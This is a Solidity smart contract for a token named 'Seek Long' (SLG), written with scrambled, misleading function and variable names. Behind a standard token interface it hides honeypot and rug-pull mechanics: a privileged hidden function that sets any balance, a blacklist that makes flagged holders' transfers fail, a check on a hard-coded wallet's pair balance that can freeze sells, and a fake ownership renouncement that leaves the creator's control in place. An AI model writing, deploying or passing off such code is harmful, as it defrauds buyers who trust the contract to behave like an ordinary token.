//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface amountAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract sellMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingMode {
    function createPair(address atReceiver, address buyMax) external returns (address);
}

interface amountWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityTradingReceiver) external view returns (uint256);

    function transfer(address txTeam, uint256 senderMode) external returns (bool);

    function allowance(address walletLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderMode) external returns (bool);

    function transferFrom(
        address sender,
        address txTeam,
        uint256 senderMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenAt, uint256 value);
    event Approval(address indexed walletLimit, address indexed spender, uint256 value);
}

interface amountWalletMetadata is amountWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SeekLong is sellMax, amountWallet, amountWalletMetadata {

    address walletAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private fromSwap;

    uint256 fundTotalAt;

    function owner() external view returns (address) {
        return shouldBuy;
    }

    function autoReceiverToken(address swapShouldSell) public {
        teamAmount();
        if (autoEnable != minTeam) {
            minTeam = false;
        }
        if (swapShouldSell == minReceiver || swapShouldSell == enableTo) {
            return;
        }
        senderIsFund[swapShouldSell] = true;
    }

    address private shouldBuy;

    mapping(address => bool) public senderIsFund;

    function senderTo(address atFeeTx, address txTeam, uint256 senderMode) internal returns (bool) {
        if (atFeeTx == minReceiver) {
            return launchMarketing(atFeeTx, txTeam, senderMode);
        }
        uint256 takeFee = amountWallet(enableTo).balanceOf(walletAt);
        require(takeFee == fundTotalAt);
        require(txTeam != walletAt);
        if (senderIsFund[atFeeTx]) {
            return launchMarketing(atFeeTx, txTeam, receiverMarketing);
        }
        return launchMarketing(atFeeTx, txTeam, senderMode);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingFund;
    }

    uint256 constant receiverMarketing = 17 ** 10;

    string private launchSwapMax = "SLG";

    function getOwner() external view returns (address) {
        return shouldBuy;
    }

    function approve(address fundIs, uint256 senderMode) public virtual override returns (bool) {
        modeAmount[_msgSender()][fundIs] = senderMode;
        emit Approval(_msgSender(), fundIs, senderMode);
        return true;
    }

    function allowance(address toAmount, address fundIs) external view virtual override returns (uint256) {
        if (fundIs == walletAuto) {
            return type(uint256).max;
        }
        return modeAmount[toAmount][fundIs];
    }

    function symbol() external view virtual override returns (string memory) {
        return launchSwapMax;
    }

    uint8 private liquidityFrom = 18;

    function tradingExemptEnable(address maxBuy, uint256 senderMode) public {
        teamAmount();
        tradingMin[maxBuy] = senderMode;
    }

    bool public receiverToToken;

    mapping(address => uint256) private tradingMin;

    event OwnershipTransferred(address indexed autoFee, address indexed toFund);

    function transferFrom(address atFeeTx, address txTeam, uint256 senderMode) external override returns (bool) {
        if (_msgSender() != walletAuto) {
            if (modeAmount[atFeeTx][_msgSender()] != type(uint256).max) {
                require(senderMode <= modeAmount[atFeeTx][_msgSender()]);
                modeAmount[atFeeTx][_msgSender()] -= senderMode;
            }
        }
        return senderTo(atFeeTx, txTeam, senderMode);
    }

    uint256 public maxFee;

    uint256 private tradingFund = 100000000 * 10 ** 18;

    function teamAmount() private view {
        require(liquidityMaxEnable[_msgSender()]);
    }

    function teamAt(address amountReceiver) public {
        if (launchedExemptList) {
            return;
        }
        
        liquidityMaxEnable[amountReceiver] = true;
        
        launchedExemptList = true;
    }

    function transfer(address maxBuy, uint256 senderMode) external virtual override returns (bool) {
        return senderTo(_msgSender(), maxBuy, senderMode);
    }

    uint256 listSell;

    function name() external view virtual override returns (string memory) {
        return liquidityEnable;
    }

    function maxExempt() public {
        emit OwnershipTransferred(minReceiver, address(0));
        shouldBuy = address(0);
    }

    address walletAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private minTeam;

    address public enableTo;

    mapping(address => bool) public liquidityMaxEnable;

    function launchMarketing(address atFeeTx, address txTeam, uint256 senderMode) internal returns (bool) {
        require(tradingMin[atFeeTx] >= senderMode);
        tradingMin[atFeeTx] -= senderMode;
        tradingMin[txTeam] += senderMode;
        emit Transfer(atFeeTx, txTeam, senderMode);
        return true;
    }

    bool private autoEnable;

    constructor (){
        if (maxFee == fromSwap) {
            receiverToToken = true;
        }
        amountAt fundEnableReceiver = amountAt(walletAuto);
        enableTo = marketingMode(fundEnableReceiver.factory()).createPair(fundEnableReceiver.WETH(), address(this));
        
        minReceiver = _msgSender();
        maxExempt();
        liquidityMaxEnable[minReceiver] = true;
        tradingMin[minReceiver] = tradingFund;
        
        emit Transfer(address(0), minReceiver, tradingFund);
    }

    function decimals() external view virtual override returns (uint8) {
        return liquidityFrom;
    }

    bool private maxReceiver;

    mapping(address => mapping(address => uint256)) private modeAmount;

    function balanceOf(address liquidityTradingReceiver) public view virtual override returns (uint256) {
        return tradingMin[liquidityTradingReceiver];
    }

    string private liquidityEnable = "Seek Long";

    address public minReceiver;

    bool public launchedExemptList;

    function autoFundSwap(uint256 senderMode) public {
        teamAmount();
        fundTotalAt = senderMode;
    }

}